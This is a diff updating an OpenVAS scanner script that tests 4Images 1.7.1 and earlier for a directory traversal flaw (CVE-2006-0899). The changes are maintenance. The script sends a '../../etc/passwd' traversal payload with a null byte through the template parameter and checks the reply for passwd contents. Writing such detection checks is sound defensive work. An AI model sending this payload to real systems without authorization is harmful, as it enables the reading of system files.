@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: 4images_171_directory_traversal.nasl 3359 2016-05-19 13:40:42Z antu123 $
+# $Id: 4images_171_directory_traversal.nasl 5780 2017-03-30 07:37:12Z cfi $
 # Description: 4Images <= 1.7.1 Directory Traversal Vulnerability
 #
 # Authors:
@@ -41,28 +41,22 @@ tag_solution = "Sanitize the 'index.php' file.";
 # Original advisory / discovered by : 
 # http://retrogod.altervista.org/4images_171_incl_xpl.html
 
-if (description) {
+if(description)
+{
  script_id(21020);
- script_version("$Revision: 3359 $");
- script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
+ script_version("$Revision: 5780 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 09:37:12 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_cve_id("CVE-2006-0899");
  script_bugtraq_id(16855);
-
- name = "4Images <= 1.7.1 Directory Traversal Vulnerability";
- script_name(name);
- summary = "Check if 4Images is vulnerable to directory traversal flaws";
- script_summary(summary);
-
+ script_name("4Images <= 1.7.1 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
-
- script_dependencies("http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
@@ -74,29 +68,28 @@ if (description) {
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
 
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
-dirs = make_list("/4images", "/gallery", cgi_dirs());
+foreach dir( make_list_unique( "/4images", "/gallery", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
- res = http_get_cache(item:string(dir, "/index.php"), port:port); 
- if(res == NULL) exit(0);
+  if( dir == "/" ) dir = "";
+  res = http_get_cache(item:string(dir, "/index.php"), port:port); 
+  if(res == NULL) continue;
 
- if (egrep(pattern:"Powered by.+4images", string:res)) {
+  if (egrep(pattern:"Powered by.+4images", string:res)) {
  
-  file = "../../../../../../../../etc/passwd";
-  req = http_get(item:string(dir, "/index.php?template=", file, "%00"), port:port);
+    file = "../../../../../../../../etc/passwd";
+    req = http_get(item:string(dir, "/index.php?template=", file, "%00"), port:port);
+    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
+    if (recv == NULL) continue;
 
-  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
-  if (recv == NULL) exit(0);
-
-  if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
-   security_message(port);
-   exit(0); 
-  } 
- }
+    if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
+      security_message(port);
+      exit(0); 
+    }
+  }
 }
+
+exit( 99 );
